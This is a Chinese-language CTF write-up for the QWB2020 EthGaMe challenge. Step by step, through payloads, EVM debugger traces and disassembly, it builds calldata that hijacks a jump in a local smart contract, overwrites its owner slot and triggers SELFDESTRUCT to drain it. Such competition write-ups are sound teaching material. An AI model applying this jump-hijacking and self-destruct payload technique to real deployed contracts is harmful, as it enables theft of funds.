---
layout: post
title:  "QWB2020 EthGaMe Fuzz"
date:   2020-07-19 11:07:32 +0800
categories: qwb
---
虽然没完全理解题目到底什么逻辑（各路反编译器纷纷落败），但是依旧可以硬做

0. 开始之前还是要用panoramix等反编译器看一看，找找入口
1. ```Backdoor()```不收钱，所以fuzz不需要考虑金额
2. 本地部署game，测试地址```0x09700F458266CC3b4d36e8Ce94aFACCD1368572e```
3. 先发送一个足够长的data，以```8d715d9d```(Backdoor())为func selector

```python
payload = 'a'*64+'b'*64+'c'*64+'d'*64
estimate_gas(game, '8d715d9d' + payload, 0x0)

-> [G] execution reverted: VM Exception while processing transaction: invalid JUMP at d96a9348922b466b5e39a1319a466065b7c4c1a7fac502cfbd1c1ebcc4320886/09700f458266cc3b4d36e8ce94afaccd1368572e:232
```
4. 强制交易，加载调试，跳到最后一步

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> g 5721
Memory:
  0x00040:   0000000000000000000000000000000000000000000000000000000000100000
  0x00100:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00140:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x00160:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00180:   dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
  0x001a0:   0000000000000000000000000000000000000000000000000000000000000000
  0x001c0:   0000000000000000000000000000000000000000000000000000000000000140
  0x001e0:   0000000000000000000000000000000000000000000000000000000000000060
  0x00200:   0000000000000000000000000000000000000000000000000000000000000080
  0x13000:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x13020:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x13040:   dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
  0x13060:   0000000000000000000000000000000000000000000000000000000000000000
  0x13080:   0000000000000000000000000000000000000000000000000000000000000000

Storage:
  (empty)

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (2 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (1 from top)
  dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd (top)

(5721/5721) JUMP
  PC = 232 = 0xe8
```
可以看到跳转地址是第四个padding，有一个任意地址跳
5. 分析汇编码可得，想要清空合约余额，只有一个SELFDESTRUCT可用，要求storage[0x66]和caller相等

```
00000372    (882): JUMPDEST     ; #0
00000373    (883): PUSH1 0x66   ; #1
00000375    (885): SLOAD        ; #1
00000376    (886): CALLER       ; #2
00000377    (887): EQ           ; #1
00000378    (888): ISZERO       ; #1
00000379    (889): PUSH2 0x78   ; #2
0000037c    (892): JUMPI        ; #0
0000037d    (893): PUSH1 0x66   ; #1
0000037f    (895): SLOAD        ; #1
00000380    (896): SELFDESTRUCT  ; #0
```
6. 搜索包含SSTORE指令的字节码块，一共有两个块，其中一个是第五步中的块由于前置条件导致不可用，另一个块如下

```
000002f5    (757): JUMPDEST     ; #0
000002f6    (758): PUSH1 0x20   ; #1
000002f8    (760): PUSH2 0x100  ; #2
000002fb    (763): MLOAD        ; #2
000002fc    (764): SUB          ; #1
000002fd    (765): MLOAD        ; #1
000002fe    (766): PUSH2 0x100  ; #2
00000301    (769): MLOAD        ; #2
00000302    (770): MLOAD        ; #2
00000303    (771): SSTORE       ; #0
00000304    (772): PUSH2 0x30b  ; #1
00000307    (775): PUSH2 0xa6   ; #2
0000030a    (778): JUMP         ; #1
```
7. 修改payload，尝试之间跳到```0x2f5```

```python
payload = 'a'*64+'b'*64+'c'*64+'2f5'.zfill(64)
send_txn(game, '8d715d9d' + payload, 0x0)

-> VM Exception while processing transaction: out of gas
```
8. 调试第七步中的交易

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> g 5727

Memory:
  0x00040:   0000000000000000000000000000000000000000000000000000000000100000
  0x00100:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00140:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x00160:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00180:   00000000000000000000000000000000000000000000000000000000000002f5
  0x001a0:   0000000000000000000000000000000000000000000000000000000000000000
  0x001c0:   0000000000000000000000000000000000000000000000000000000000000140
  0x001e0:   0000000000000000000000000000000000000000000000000000000000000060
  0x00200:   0000000000000000000000000000000000000000000000000000000000000080
  0x13000:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x13020:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x13040:   00000000000000000000000000000000000000000000000000000000000002f5
  0x13060:   0000000000000000000000000000000000000000000000000000000000000000
  0x13080:   0000000000000000000000000000000000000000000000000000000000000000

Storage:
  (empty)

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (2 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (1 from top)
  ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccac (top)

(5727/5727) MLOAD
  PC = 765 = 0x2fd
```
可以看到尝试MLOAD一个过大的地址导致out of gas，这个```ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccac```是```padding3-0x20```得到的值，不确定的话可以```n -1```单步跳回验证
9. 查看```pc=765```处的逻辑

```
000002f5    (757): JUMPDEST     ; []
000002f6    (758): PUSH1 0x20   ; [0x20]
000002f8    (760): PUSH2 0x100  ; [0x20, 0x100]
000002fb    (763): MLOAD        ; [0x20, m[0x100]]
000002fc    (764): SUB          ; [m[0x100]-0x20]
000002fd    (765): MLOAD        ; [ m[m[0x100]-0x20] ]
000002fe    (766): PUSH2 0x100  ; #2
00000301    (769): MLOAD        ; #2
00000302    (770): MLOAD        ; [ m[m[0x100]-0x20] , m[m[0x100]] ]
00000303    (771): SSTORE       ; HERE!
00000304    (772): PUSH2 0x30b  ; #1
00000307    (775): PUSH2 0xa6   ; #2
0000030a    (778): JUMP         ; #1
```
分析可得，要使```stor[0x66]==player```，需要内存上连续两个slot依次为```[player, 0x66]```，padding3则指向0x66所在的slot
进一步查看8中的内存发现，padding2的64个b被复制到了memory中，但64个a被吃了，因此没法通过padding1和padding2构造内存，尝试增加padding
10. 构造新的payload并调试

```python
payload = 'a'*64+'b'*64+'c'*64+'2f5'.zfill(64)+'e'*64+'f'*64

-> execution reverted: VM Exception while processing transaction: out of gas
```
调试发现只有4651步，比之前少了，查看最后一步出了什么问题

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> g 4651

Memory:
  0x00040:   0000000000000000000000000000000000000000000000000000000000100000
  0x00100:   0000000000000000000000000000000000000000000000000000000000000200
  0x00140:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x00160:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00180:   00000000000000000000000000000000000000000000000000000000000002f5
  0x001a0:   ee00000000000000000000000000000000000000000000000000000000000140
  0x001c0:   0000000000000000000000000000000000000000000000000000000000000140
  0x001e0:   00000000000000000000000000000000000000000000000000000000000000a0
  0x00200:   0000000000000000000000000000000000000000000000000000000000000061
  0x13000:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x13020:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x13040:   00000000000000000000000000000000000000000000000000000000000002f5
  0x13060:   eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
  0x13080:   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
  0x130a0:   0000000000000000000000000000000000000000000000000000000000000000
  0x130c0:   0000000000000000000000000000000000000000000000000000000000000000

Storage:
  (empty)

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (3 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (2 from top)
  0100000000000000000000000000000000000000000000000000000000000000 (1 from top)
  ee00000000000000000000000000000000000000000000000000000000013061 (top)

(4651/4651) MLOAD
  PC = 438 = 0x1b6
```
可以发现MLOAD一个0xee开头的地址，确实会out of gas，即padding5中的一部分，那么把padding5改为```'0'*64```，padding5、padding6的e、f顺延一个slot
11. 修改payload继续测试

```python
payload = 'a'*64+'b'*64+'c'*64+'2f5'.zfill(64)+'0'*64+'e'*64+'f'*64
-> [G] execution reverted: VM Exception while processing transaction: out of gas
```
9151步，虽然还是out of gas但是更进一步了

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> g 9151

Memory:
  0x00040:   0000000000000000000000000000000000000000000000000000000000100000
  0x000c0:   0000000000000000000000000000000000000000000000000000000000000000
  0x000e0:   0000000000000000000000000000000000000000000000000000000000000000
  0x00100:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00140:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x00160:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x00180:   00000000000000000000000000000000000000000000000000000000000002f5
  0x001a0:   0000000000000000000000000000000000000000000000000000000000000000
  0x001c0:   00000000000000000000000000000000000000000000000000000000000000c0
  0x001e0:   00000000000000000000000000000000000000000000000000000000000000c0
  0x00200:   00000000000000000000000000000000000000000000000000000000000000c0
  0x13000:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x13020:   cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
  0x13040:   00000000000000000000000000000000000000000000000000000000000002f5
  0x13060:   0000000000000000000000000000000000000000000000000000000000000000
  0x13080:   eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
  0x130a0:   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
  0x130c0:   0000000000000000000000000000000000000000000000000000000000000000
  0x130e0:   0000000000000000000000000000000000000000000000000000000000000000

Storage:
  (empty)

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (2 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (1 from top)
  ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccac (top)

(9151/9151) MLOAD
  PC = 765 = 0x2fd
```
可以看到padding5、6的e、f已经上到memory，地址分别是13080和130a0
12. 尝试构造payload

```python
payload = 'a'*64+'b'*64+'130a0'.zfill(64)+'2f5'.zfill(64)+'0'*64+player[2:].zfill(64)+'66'.zfill(64)

-> [G] execution reverted: VM Exception while processing transaction: invalid JUMP at d96a9348922b466b5e39a1319a466065b7c4c1a7fac502cfbd1c1ebcc4320886/09700f458266cc3b4d36e8ce94afaccd1368572e:232
```
是一个新的invalid JUMP，有戏，调试之

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> g 9234

Memory:
  0x00040:   0000000000000000000000000000000000000000000000000000000000100000
  0x000c0:   0000000000000000000000000000000000000000000000000000000000000000
  0x000e0:   0000000000000000000000000000000000000000000000000000000000000000
  0x00100:   00000000000000000000000000000000000000000000000000000000000002f5
  0x00140:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x00160:   00000000000000000000000000000000000000000000000000000000000130a0
  0x00180:   00000000000000000000000000000000000000000000000000000000000002f5
  0x001a0:   0000000000000000000000000000000000000000000000000000000000000000
  0x001c0:   00000000000000000000000000000000000000000000000000000000000000c0
  0x001e0:   00000000000000000000000000000000000000000000000000000000000000c0
  0x00200:   00000000000000000000000000000000000000000000000000000000000000c0
  0x13000:   bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  0x13020:   00000000000000000000000000000000000000000000000000000000000130a0
  0x13040:   00000000000000000000000000000000000000000000000000000000000002f5
  0x13060:   0000000000000000000000000000000000000000000000000000000000000000
  0x13080:   000000000000000000000000233333f494990e8bba9143a1964c3d91597eee81
  0x130a0:   0000000000000000000000000000000000000000000000000000000000000066
  0x130c0:   0000000000000000000000000000000000000000000000000000000000000000
  0x130e0:   0000000000000000000000000000000000000000000000000000000000000000

Storage:
  0000000000000000000000000000000000000000000000000000000000000066:   000000000000000000000000233333f494990e8bba9143a1964c3d91597eee81

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (2 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (1 from top)
  0000000000000000000000000000000000000000000000000000000000000000 (top)

(9234/9234) JUMP
  PC = 232 = 0xe8
```
发现尝试往0地址跳，监测这个0是何时被入栈的

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> ws -1

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (3 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (2 from top)
  00000000000000000000000000000000000000000000000000000000000000d6 (1 from top)
  0000000000000000000000000000000000000000000000000000000000000000 (top)

(9206/9234) SWAP1
  PC = 183 = 0xb7
```
是个SWAP1指令，忽略，继续往前监测

```edb
debug(0x09700F458266CC3b4d36e8Ce94aFACCD1368572e)> ws -1

Memory
  ...
  0x13040:   00000000000000000000000000000000000000000000000000000000000002f5
  0x13060:   0000000000000000000000000000000000000000000000000000000000000000
  0x13080:   000000000000000000000000233333f494990e8bba9143a1964c3d91597eee81
  0x130a0:   0000000000000000000000000000000000000000000000000000000000000066
  0x130c0:   0000000000000000000000000000000000000000000000000000000000000000
  0x130e0:   0000000000000000000000000000000000000000000000000000000000000000

Storage:
  0000000000000000000000000000000000000000000000000000000000000066:   000000000000000000000000233333f494990e8bba9143a1964c3d91597eee81

Stack:
  000000000000000000000000000000000000000000000000000000008d715d9d (3 from top)
  0000000000000000000000000000000000000000000000000000000000000140 (2 from top)
  00000000000000000000000000000000000000000000000000000000000000d6 (1 from top)
  0000000000000000000000000000000000000000000000000000000000013060 (top)

(9199/9234) MLOAD
  PC = 171 = 0xab
```
是被MLOAD上去的，对应slot是0x13060，即我们修改为全0的那个padding
13. 修改全0的padding为SELFDESTRUCT指令所在的块头0x372

```python
payload = 'a'*64+'b'*64+'130a0'.zfill(64)+'2f5'.zfill(64)+'372'.zfill(64)+player[2:].zfill(64)+'66'.zfill(64)

-> Success
```
交易直接成功，检查合约发现已被销毁，AC